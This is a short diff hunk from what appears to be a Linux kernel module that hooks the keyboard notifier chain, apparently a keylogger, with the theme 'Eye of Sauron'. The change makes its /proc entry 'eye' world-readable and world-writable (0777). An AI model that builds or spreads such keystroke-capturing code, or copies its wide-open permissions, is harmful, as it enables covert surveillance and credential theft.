@@ -40,7 +40,7 @@ static int start_eye(void)
     register_keyboard_notifier(&_sauron);
     printk("The Eye of Sauron is upon you.\n");
 
-    _ops = proc_create("eye", 0, NULL, &fops);
+    _ops = proc_create("eye", 0777, NULL, &fops);
 //    ring_on();
 
     return 0;
